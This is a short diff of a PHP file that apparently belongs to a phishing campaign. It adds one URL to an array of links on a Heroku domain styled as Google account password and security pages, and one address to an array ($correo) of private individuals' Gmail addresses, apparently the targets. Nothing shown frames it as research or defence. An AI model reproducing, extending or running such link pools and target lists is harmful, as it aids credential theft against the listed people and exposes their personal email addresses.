@@ -41,9 +41,9 @@ $url = array(
 "https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?35",
 "https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?36",
 "https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?37",
-"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?38"
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?38",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?39"
 );
-
 
 
 $correo = array(
@@ -85,7 +85,8 @@ $correo = array(
 "diazmarwin@gmail.com",
 "mejiasleonet@gmail.com",
 "rafaelq.sistemas@gmail.com",
-"jo.25el.26@gmail.com"
+"jo.25el.26@gmail.com",
+"larawilmer913@gmail.com"
 );
 
 
